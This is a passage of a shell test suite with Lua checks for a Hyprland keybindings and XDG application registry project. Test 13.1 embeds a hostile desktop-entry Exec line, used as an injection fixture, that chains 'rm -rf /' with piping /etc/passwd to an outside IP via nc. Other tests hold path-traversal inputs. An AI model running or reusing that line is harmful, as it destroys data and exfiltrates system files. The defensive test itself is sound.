        "$ROOT/bin/workstation-keybindings" remove-app "custom.app.desktop" >/dev/null 2>&1
        json_final="$("$ROOT/bin/workstation-keybindings" json)"
        if [[ "$json_final" != *'"id": "app:custom.app.desktop"'* ]]; then
            pass "12.5 full user action lifecycle verified (add -> unbound -> bind -> unbind -> remove)"
        else
            fail "12.5 remove-app failed to delete user action"
        fi
    else
        fail "12.5 unset failed to return user action to unbound"
    fi
    rm -rf "$sb_cycle"
)

# 12.6: KeybindingsModel view partitioning, application discovery, and addApplication methods
if grep -q 'property string activeView: "bound"' "$qml_model" &&
   grep -q 'property var boundItems:' "$qml_model" &&
   grep -q 'property var unboundItems:' "$qml_model" &&
   grep -q 'readonly property int boundCount: boundItems.length' "$qml_model" &&
   grep -q 'readonly property int unboundCount: unboundItems.length' "$qml_model" &&
   grep -q 'function switchView(view)' "$qml_model" &&
   grep -q 'function toggleView()' "$qml_model" &&
   grep -q 'function loadApplications()' "$qml_model" &&
   grep -q 'function addApplication(desktopId)' "$qml_model" &&
   grep -q 'property Process appsProcess:' "$qml_model" &&
   grep -q 'property Process addAppProcess:' "$qml_model"; then
    pass "12.6 KeybindingsModel partitions items into Bound/Unbound views and provides application management"
else
    fail "12.6 KeybindingsModel missing Bound/Unbound properties or methods"
fi

# 12.7: KeybindingsWindow tabs, Tab view toggling, Alt+A, and view navigation
if grep -q 'text: "Bound (" + keybindingsModel.boundCount + ")"' "$qml_window" &&
   grep -q 'text: "Unbound (" + keybindingsModel.unboundCount + ")"' "$qml_window" &&
   grep -q 'keybindingsModel.switchView("bound")' "$qml_window" &&
   grep -q 'keybindingsModel.switchView("unbound")' "$qml_window" &&
   grep -q 'keybindingsModel.toggleView()' "$qml_window" &&
   grep -q 'keybindingsModel.switchView("add_app")' "$qml_window" &&
   grep -q 'rowRoot.formattedShortcut()' "$ROOT/dotfiles/aurelia/components/keybindings/KeybindingRow.qml"; then
    pass "12.7 KeybindingsWindow provides Bound/Unbound tabs, Tab view switching, and Alt+A application picker"
else
    fail "12.7 KeybindingsWindow missing Bound/Unbound tabs or keyboard view switching"
fi

section "13. Security Hardening, Platform Launcher Delegation, and Fail-Closed Invariants"

# 13.1: Desktop Entry Exec Shell Injection Immunity
test_13_1_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

local tmp = os.tmpname() .. ".desktop"
local f = io.open(tmp, "w")
f:write("[Desktop Entry]\n")
f:write("Type=Application\n")
f:write("Name=Exploit Test\n")
f:write("Exec=evil_binary $(touch /tmp/pwned_test) ; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 > /dev/null &\n")
f:write("Icon=security-high\n")
f:close()

local parsed = reg.parse_desktop_file(tmp, "exploit.desktop")
os.remove(tmp)

assert(parsed ~= nil, "parse_desktop_file failed")
assert(parsed.command == "gtk-launch -- exploit.desktop", "command mismatch")
assert(#parsed.command_argv == 3, "command_argv length mismatch")
assert(parsed.command_argv[1] == "gtk-launch" and parsed.command_argv[2] == "--" and parsed.command_argv[3] == "exploit.desktop")
assert(not io.open("/tmp/pwned_test", "r"), "Shell injection occurred during parse!")
print("TEST_13_1_OK")
LUA_CHECK
)"
if grep -q "TEST_13_1_OK" <<< "$test_13_1_out"; then
    pass "13.1 desktop entry parsing has zero shell execution and strictly delegates to gtk-launch"
else
    fail "13.1 shell injection immunity test failed: $test_13_1_out"
fi

# 13.2: Missing Default Application Handling & Fail-Closed Policy B
test_13_2_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local reg = require("application_registry")
local manifest = require("keybindings_manifest")

-- 1. Test missing configured app with recommended app available (kitty is installed)
local tmp_conf = os.tmpname()
local f = io.open(tmp_conf, "w")
f:write("terminal.default = nonexistent_terminal_xyz\n")
f:close()

reg.get_desktop_config_path = function() return tmp_conf end
reg.invalidate_cache()

local canon, info = reg.resolve_role("terminal")
os.remove(tmp_conf)
assert(canon == "kitty", "Expected fallback to recommended kitty, got: " .. tostring(canon))
assert(info ~= nil and info.desktop_id == "kitty.desktop")

-- 2. Test missing configured app AND missing recommended app (fail closed, no fake record)
reg.find_application = function(id) return nil end
reg.invalidate_cache()

local canon2, info2 = reg.resolve_role("terminal")
assert(canon2 == nil, "Expected nil when all options missing, got: " .. tostring(canon2))
assert(info2 ~= nil and type(info2) == "string", "Expected error message as second return value")

local argv, err = eff.get_action_argv("terminal", manifest)
assert(argv == nil, "get_action_argv should fail closed when role app is unavailable")
assert(err:find("not available"), "Error message mismatch: " .. tostring(err))

local effective = eff.resolve_bindings(manifest, {})
local term_item = nil
for _, b in ipairs(effective.bindings) do
    if b.id == "terminal" then term_item = b break end
end
assert(term_item ~= nil, "terminal binding missing in effective")
assert(term_item.runnable == false, "term_item should be marked unrunnable")
assert(term_item.command == nil, "term_item.command should be nil")
assert(term_item.description:find("%(unavailable%)"), "term_item.description should indicate unavailable")

print("TEST_13_2_OK")
LUA_CHECK
)"
if grep -q "TEST_13_2_OK" <<< "$test_13_2_out"; then
    pass "13.2 Policy B: missing default falls back to Recommended; missing Recommended fails closed without fake synthesis"
else
    fail "13.2 fail-closed Policy B test failed: $test_13_2_out"
fi

# 13.3: Production Environment Override Lockdown
test_13_3_out="$(env -u WORKSTATION_TEST_MODE DEFAULT_TERMINAL=foot TERMINAL=foot DEFAULT_FILE_MANAGER=thunar DEFAULT_BROWSER=firefox "$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")
reg.invalidate_cache()

local canon_term, info_term = reg.resolve_role("terminal")
local canon_fm, info_fm     = reg.resolve_role("file-manager")
local canon_br, info_br     = reg.resolve_role("browser")

assert(canon_term ~= "foot" and info_term.desktop_id ~= "foot.desktop", "DEFAULT_TERMINAL override leaked into production!")
assert(canon_fm ~= "thunar" and info_fm.desktop_id ~= "thunar.desktop", "DEFAULT_FILE_MANAGER override leaked into production!")
assert(canon_br ~= "firefox" and info_br.desktop_id ~= "org.mozilla.firefox.desktop", "DEFAULT_BROWSER override leaked into production!")

print("PROD_LOCKDOWN_OK")
LUA_CHECK
)"
if grep -q "PROD_LOCKDOWN_OK" <<< "$test_13_3_out"; then
    pass "13.3 environment overrides strictly locked down outside WORKSTATION_TEST_MODE=1"
else
    fail "13.3 production environment lockdown failed: $test_13_3_out"
fi

# 13.4: Strict Fail-Closed user_actions.json Parser Negative Test Matrix
test_13_4_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")

local function must_fail(str, desc)
    local res, err = eff.parse_strict_user_actions(str)
    assert(res == nil, "Expected failure for: " .. desc .. ", got success: " .. tostring(res))
    assert(err ~= nil and #err > 0, "Expected error message for: " .. desc)
end

-- 1. Non-object root
must_fail("[]", "array root")
must_fail('"hello"', "string root")
must_fail("123", "number root")
must_fail("true", "boolean root")

-- 2. Missing or invalid version
must_fail('{"actions": []}', "missing version")
must_fail('{"version": 2, "actions": []}', "unsupported version 2")
must_fail('{"version": "1", "actions": []}', "string version")

-- 3. Missing or invalid actions
must_fail('{"version": 1}', "missing actions")
must_fail('{"version": 1, "actions": "app.desktop"}', "string actions")
must_fail('{"version": 1, "actions": 123}', "number actions")

-- 4. Malformed desktop IDs in actions
must_fail('{"version": 1, "actions": ["../evil.desktop"]}', "path traversal ../")
must_fail('{"version": 1, "actions": ["foo/../../bar.desktop"]}', "nested path traversal")
must_fail('{"version": 1, "actions": ["-rf.desktop"]}', "leading dash")
must_fail('{"version": 1, "actions": ["app_without_extension"]}', "missing .desktop")
must_fail('{"version": 1, "actions": ["bad name;.desktop"]}', "semicolon in desktop ID")

-- 5. Trailing garbage
must_fail('{"version": 1, "actions": []} trailing', "trailing garbage")
must_fail('{"version": 1, "actions": []},', "trailing comma")

-- 6. Payload bounding (> 64KB)
local huge_payload = '{"version": 1, "actions": [' .. string.rep('"a.desktop",', 6000) .. '"b.desktop"]}'
assert(#huge_payload > 65536)
must_fail(huge_payload, "oversized payload > 64KB")

-- 7. Valid payload with escapes and UTF-8
local valid_json = '{\n  "version": 1,\n  "actions": [\n    "\\u0061pp.desktop",\n    "second-app.desktop"\n  ]\n}'
local parsed, p_err = eff.parse_strict_user_actions(valid_json)
assert(parsed ~= nil, "Failed to parse valid json: " .. tostring(p_err))
assert(#parsed.actions == 2)
assert(parsed.actions[1] == "app.desktop", "Escape decoding failed")
assert(parsed.actions[2] == "second-app.desktop")

-- 8. Deduplication
local dup_json = '{"version": 1, "actions": ["app.desktop", "app.desktop"]}'
local p_dup = eff.parse_strict_user_actions(dup_json)
assert(p_dup ~= nil and #p_dup.actions == 1, "Duplicate action not deduplicated")

print("STRICT_PARSER_OK")
LUA_CHECK
)"
if grep -q "STRICT_PARSER_OK" <<< "$test_13_4_out"; then
    pass "13.4 user_actions.json parser enforces strict fail-closed schema, bounds, and traversal safety"
else
    fail "13.4 strict user_actions parser negative matrix failed: $test_13_4_out"
fi

# 13.5: XDG Desktop Identity, Subdirectory Derivation, and Precedence Masking
test_13_5_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

-- 1. Subdirectory desktop ID derivation
local did1 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/sub/app.desktop")
local did2 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/org/gnome/Software.desktop")
local did3 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/kitty.desktop")
assert(did1 == "sub-app.desktop", "Expected sub-app.desktop, got: " .. tostring(did1))
assert(did2 == "org-gnome-Software.desktop", "Expected org-gnome-Software.desktop, got: " .. tostring(did2))
assert(did3 == "kitty.desktop", "Expected kitty.desktop, got: " .. tostring(did3))

-- 2. TryExec checking
local tmp_try = os.tmpname() .. ".desktop"
local f = io.open(tmp_try, "w")
f:write("[Desktop Entry]\nType=Application\nName=TryExec Test\nExec=try-test\nTryExec=/nonexistent/binary_xyz_123\n")
f:close()
local parsed_te = reg.parse_desktop_file(tmp_try, "try-test.desktop")
os.remove(tmp_try)
assert(parsed_te == nil, "parse_desktop_file should reject non-existent TryExec")

-- 3. Hidden=true masking
local tmp_dir = os.tmpname() .. "_dir"
os.execute("mkdir -p " .. tmp_dir .. "/user/applications " .. tmp_dir .. "/sys/applications")

local f_sys = io.open(tmp_dir .. "/sys/applications/test-masked.desktop", "w")
f_sys:write("[Desktop Entry]\nType=Application\nName=System App\nExec=sys-app\n")
f_sys:close()

local f_user = io.open(tmp_dir .. "/user/applications/test-masked.desktop", "w")
f_user:write("[Desktop Entry]\nType=Application\nName=System App\nHidden=true\n")
f_user:close()

local prev_dirs = reg.get_applications_search_dirs
reg.get_applications_search_dirs = function()
    return { tmp_dir .. "/user/applications", tmp_dir .. "/sys/applications" }
end
reg.invalidate_cache()

local found = reg.find_application("test-masked.desktop")
reg.get_applications_search_dirs = prev_dirs
reg.invalidate_cache()
os.execute("rm -rf " .. tmp_dir)

assert(found == nil, "Hidden=true user entry failed to mask lower-precedence system entry")

print("XDG_IDENTITY_OK")
LUA_CHECK
)"
if grep -q "XDG_IDENTITY_OK" <<< "$test_13_5_out"; then
    pass "13.5 XDG desktop identity: subdirectory derivation, TryExec checking, and Hidden=true masking"
else
    fail "13.5 XDG desktop identity test failed: $test_13_5_out"
fi

# 13.6: Aurelia Keybindings Primary S and U Keys & Search Input Separation
if grep -q 'focus: true' "$qml_window" &&
   grep -q 'event.key === Qt.Key_S' "$qml_window" &&
   grep -q 'event.key === Qt.Key_U' "$qml_window" &&
   grep -q 'text: "S"' "$qml_window" &&
   grep -q 'text: "U"' "$qml_window" &&
   ! grep -q 'text: "Alt+S"' "$qml_window" &&
   ! grep -q 'text: "Alt+U"' "$qml_window"; then
    pass "13.6 KeybindingsWindow uses primary S and U shortcuts with separated search input focus"
else
    fail "13.6 primary S and U shortcut configuration incomplete in KeybindingsWindow"
fi

section "14. Advanced XDG Application Discovery, Real Executable Resolution, and Cache Invariants"

# 14.1: Nested XDG Application Discovery & Canonical Desktop ID Derivation at Multiple Depths
test_14_1_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

-- 1. Canonical desktop ID derivation at multiple depths per XDG specification
local base = "/usr/share/applications"
assert(reg.derive_desktop_id(base, base .. "/app.desktop") == "app.desktop", "depth 0 derivation failed")
assert(reg.derive_desktop_id(base, base .. "/foo/app.desktop") == "foo-app.desktop", "depth 1 derivation failed")
assert(reg.derive_desktop_id(base, base .. "/foo/bar/app.desktop") == "foo-bar-app.desktop", "depth 2 derivation failed")
assert(reg.derive_desktop_id(base, base .. "/foo/bar/baz/qux.desktop") == "foo-bar-baz-qux.desktop", "depth 3 derivation failed")

-- 2. Physical nested directory scanning with symlink loop and escape resilience
local tmp = os.tmpname() .. "_nest"
os.execute("rm -rf " .. tmp .. " && mkdir -p " .. tmp .. "/foo/bar/baz")
os.execute("touch " .. tmp .. "/top.desktop")
os.execute("touch " .. tmp .. "/foo/one.desktop")
os.execute("touch " .. tmp .. "/foo/bar/two.desktop")
os.execute("touch " .. tmp .. "/foo/bar/baz/three.desktop")
-- Unsafe symlink loop: foo/bar/loop -> foo
os.execute("ln -s " .. tmp .. "/foo " .. tmp .. "/foo/bar/loop")
-- Unsafe symlink escape: foo/escape_etc -> /etc
os.execute("ln -s /etc " .. tmp .. "/foo/escape_etc")

local scanned = reg.scan_desktop_files_in_dir(tmp)
os.execute("rm -rf " .. tmp)

local by_id = {}
for _, s in ipairs(scanned) do
    by_id[s.desktop_id] = s.path
end

assert(by_id["top.desktop"] ~= nil, "Missing top.desktop")
assert(by_id["foo-one.desktop"] ~= nil, "Missing foo-one.desktop")
assert(by_id["foo-bar-two.desktop"] ~= nil, "Missing foo-bar-two.desktop")
assert(by_id["foo-bar-baz-three.desktop"] ~= nil, "Missing foo-bar-baz-three.desktop")
assert(by_id["foo-bar-loop-one.desktop"] == nil, "Symlink loop was followed!")

print("TEST_14_1_OK")
LUA_CHECK
)"
if grep -q "TEST_14_1_OK" <<< "$test_14_1_out"; then
    pass "14.1 nested XDG application discovery and canonical desktop ID derivation at multiple depths"
else
    fail "14.1 nested XDG discovery test failed: $test_14_1_out"
fi

# 14.2: Nested Hidden=true Masking and XDG Directory Precedence
test_14_2_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

local tmp = os.tmpname() .. "_xdg_prec"
local user_dir = tmp .. "/user/applications"
local sys_dir = tmp .. "/sys/applications"
os.execute("mkdir -p " .. user_dir .. "/a/b " .. sys_dir .. "/a/b")

-- 1. User nested file with Hidden=true masks system nested file
local f_sys = io.open(sys_dir .. "/a/b/masked-app.desktop", "w")
f_sys:write("[Desktop Entry]\nType=Application\nName=System Nested App\nExec=true\n")
f_sys:close()

local f_usr = io.open(user_dir .. "/a/b/masked-app.desktop", "w")
f_usr:write("[Desktop Entry]\nType=Application\nName=User Nested Mask\nHidden=true\n")
f_usr:close()

-- 2. User nested file overrides system nested file (precedence)
local f_sys2 = io.open(sys_dir .. "/a/b/override-app.desktop", "w")
f_sys2:write("[Desktop Entry]\nType=Application\nName=System Name\nExec=true\n")
f_sys2:close()

local f_usr2 = io.open(user_dir .. "/a/b/override-app.desktop", "w")
f_usr2:write("[Desktop Entry]\nType=Application\nName=User Name Override\nExec=true\n")
f_usr2:close()

local prev_fn = reg.get_applications_search_dirs
reg.get_applications_search_dirs = function()
    return { user_dir, sys_dir }
end
reg.invalidate_cache()

local found_masked = reg.find_application("a-b-masked-app.desktop")
local found_over = reg.find_application("a-b-override-app.desktop")

reg.get_applications_search_dirs = prev_fn
reg.invalidate_cache()
os.execute("rm -rf " .. tmp)

assert(found_masked == nil, "Hidden=true nested user entry failed to mask system entry")
assert(found_over ~= nil, "Override nested app not found")
assert(found_over.name == "User Name Override", "User entry did not take precedence: " .. tostring(found_over.name))

print("TEST_14_2_OK")
LUA_CHECK
)"
if grep -q "TEST_14_2_OK" <<< "$test_14_2_out"; then
    pass "14.2 nested Hidden=true masking and XDG directory precedence"
else
    fail "14.2 nested masking and precedence test failed: $test_14_2_out"
fi

# 14.3: Real Executable Resolution for TryExec (Custom PATH, Permissions, Absolute, Missing, Malformed, No Hardcoded Paths)
test_14_3_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")
local ffi = require("ffi")
ffi.cdef[[ int setenv(const char *name, const char *value, int overwrite); ]]

local tmp = os.tmpname() .. "_tryexec"
local bin_dir = tmp .. "/custom_isolated_bin"
os.execute("mkdir -p " .. bin_dir)

-- Executable file in custom PATH directory (NOT in /usr/bin, /usr/local/bin, /bin, ~/.local/bin)
os.execute("touch " .. bin_dir .. "/custom-tool && chmod +x " .. bin_dir .. "/custom-tool")
-- Non-executable file in custom PATH directory
os.execute("touch " .. bin_dir .. "/noexec-tool && chmod -x " .. bin_dir .. "/noexec-tool")

local orig_path = os.getenv("PATH") or ""
-- Set PATH with leading/trailing colons and empty entries to test safe handling
local test_path = ":" .. bin_dir .. "::/nonexistent_dir:"
ffi.C.setenv("PATH", test_path, 1)

local function make_desktop_with_tryexec(te_val)
    local tmp_df = os.tmpname() .. ".desktop"
    local f = io.open(tmp_df, "w")
    f:write("[Desktop Entry]\nType=Application\nName=TryExec App\nExec=true\nTryExec=" .. te_val .. "\n")
    f:close()
    local res = reg.parse_desktop_file(tmp_df, "tryexec-app.desktop")
    os.remove(tmp_df)
    return res
end

-- 1. TryExec via custom PATH: discovered
assert(reg.is_tryexec_valid("custom-tool") == true, "Executable in custom PATH directory not recognized")
assert(make_desktop_with_tryexec("custom-tool") ~= nil, "Desktop with custom-tool in PATH rejected")

-- 2. TryExec executable permission: non-executable file rejected
assert(reg.is_tryexec_valid("noexec-tool") == false, "Non-executable file in PATH was accepted")
assert(make_desktop_with_tryexec("noexec-tool") == nil, "Desktop with non-executable TryExec accepted")

-- 3. Missing executable rejected
assert(reg.is_tryexec_valid("completely_missing_xyz") == false, "Missing executable was accepted")
assert(make_desktop_with_tryexec("completely_missing_xyz") == nil, "Desktop with missing TryExec accepted")

-- 4. Absolute executable: verified appropriately
assert(reg.is_tryexec_valid(bin_dir .. "/custom-tool") == true, "Absolute executable path rejected")
assert(make_desktop_with_tryexec(bin_dir .. "/custom-tool") ~= nil, "Desktop with absolute executable TryExec rejected")

-- 5. Absolute non-executable rejected
assert(reg.is_tryexec_valid(bin_dir .. "/noexec-tool") == false, "Absolute non-executable accepted")
assert(make_desktop_with_tryexec(bin_dir .. "/noexec-tool") == nil, "Desktop with absolute non-executable TryExec accepted")
assert(reg.is_tryexec_valid("/etc/passwd") == false, "Absolute non-executable file accepted")
assert(make_desktop_with_tryexec("/etc/passwd") == nil, "Desktop with /etc/passwd TryExec accepted")

-- 6. Absolute directory rejected (not an executable file)
assert(reg.is_tryexec_valid(bin_dir) == false, "Directory accepted as executable")
assert(make_desktop_with_tryexec(bin_dir) == nil, "Desktop with directory TryExec accepted")
assert(reg.is_tryexec_valid("/usr") == false, "System directory /usr accepted as executable")
assert(make_desktop_with_tryexec("/usr") == nil, "Desktop with /usr directory TryExec accepted")

-- 7. Malformed TryExec values safely rejected
assert(reg.is_tryexec_valid("") == false, "Empty TryExec accepted")
assert(reg.is_tryexec_valid("   ") == false, "Whitespace TryExec accepted")
assert(reg.is_tryexec_valid("../evil") == false, "Relative path with slash accepted in PATH lookup")
assert(make_desktop_with_tryexec("../evil") == nil, "Desktop with ../evil TryExec accepted")
assert(reg.is_tryexec_valid("bin/tool") == false, "Relative path with slash accepted in PATH lookup")
assert(reg.is_tryexec_valid("tool\nbad") == false, "Control characters accepted")
assert(reg.is_tryexec_valid("tool --flag") == false, "Arguments in TryExec accepted")

-- 8. No hardcoded directories: prove /usr/bin is NOT checked if PATH does not contain it
-- Notice test_path only contains bin_dir and nonexistent_dir!
assert(reg.is_tryexec_valid("cat") == false, "Hardcoded fallback detected! 'cat' resolved even though /usr/bin is not in PATH")

-- Restore PATH
ffi.C.setenv("PATH", orig_path, 1)
os.execute("rm -rf " .. tmp)

print("TEST_14_3_OK")
LUA_CHECK
)"
if grep -q "TEST_14_3_OK" <<< "$test_14_3_out"; then
    pass "14.3 TryExec uses real executable resolution in \$PATH without hardcoded directories"
else
    fail "14.3 TryExec resolution test failed: $test_14_3_out"
fi

# 14.4: Lazy Process-Lifetime Cache, Explicit Invalidation, and Absence of Stale Timestamp/TTL
test_14_4_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

-- 1. Absence of stale timestamp/TTL fields
assert(reg._cache_timestamp == nil, "Stale _cache_timestamp still exists on module table")

-- 2. Initial state: cache is nil
reg.invalidate_cache()
assert(reg._cache == nil, "Cache not nil after invalidate_cache")

-- 3. Population: list_applications populates lazy process-lifetime cache
local apps = reg.list_applications()
assert(type(apps) == "table", "list_applications did not return table")
assert(reg._cache ~= nil, "Cache was not populated")
assert(type(reg._cache.visible_apps) == "table", "cache.visible_apps missing")
assert(type(reg._cache.all_apps) == "table", "cache.all_apps missing")

-- Verify cached instance returned without invalidation
local cached_apps = reg.list_applications()
assert(apps == cached_apps, "Cache missed without explicit invalidation or refresh")

-- 4. Explicit invalidation
reg.invalidate_cache()
assert(reg._cache == nil, "Cache not nil after explicit invalidation")

-- 5. Explicit refresh option
local fresh_apps = reg.list_applications({ refresh = true })
assert(reg._cache ~= nil, "Cache not populated after refresh")

print("TEST_14_4_OK")
LUA_CHECK
)"
if grep -q "TEST_14_4_OK" <<< "$test_14_4_out"; then
    pass "14.4 lazy process-lifetime cache with explicit invalidation and absence of stale timestamp/TTL"
else
    fail "14.4 cache invariants test failed: $test_14_4_out"
fi

# 14.5: keybind.lua safely ignores unbound, unrunnable, or nil-command actions without crashing Hyprland
test_14_5_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path

local mock_calls = {}
local hl = {
    dsp = {
        exec_cmd = function(cmd)
            if cmd == nil or type(cmd) ~= "string" then
                error("exec_cmd: bad argument 1: expected string, got nil", 2)
            end
            return "exec:" .. cmd
        end,
        window = {
            close = function() return "close" end,
            float = function() return "float" end,
            fullscreen = function() return "fullscreen" end,
            cycle_next = function() return "cycle" end,
            drag = function() return "drag" end,
            resize = function() return "resize" end,
            move = function() return "move" end,
        },
        focus = function(arg) return "focus" end,
    },
    bind = function(key, dsp, flags)
        if type(dsp) ~= "string" and type(dsp) ~= "function" then
            error("hl.bind: dispatcher must be a dispatcher or a lua function", 2)
        end
        table.insert(mock_calls, { key = key, dsp = dsp, flags = flags })
    end
}
_G.hl = hl

-- Test that keybind.lua loads without error even if unrunnable actions with nil command exist in effective bindings
package.loaded["keybind"] = nil
local ok, err = pcall(require, "keybind")
assert(ok == true, "keybind.lua failed to load with mock hl: " .. tostring(err))
assert(#mock_calls > 0, "No bindings registered by keybind.lua")

print("TEST_14_5_OK")
LUA_CHECK
)"
if grep -q "TEST_14_5_OK" <<< "$test_14_5_out"; then
    pass "14.5 keybind.lua safely ignores unbound, unrunnable, or nil-command actions"
else
    fail "14.5 keybind.lua defensive binding test failed: $test_14_5_out"
fi


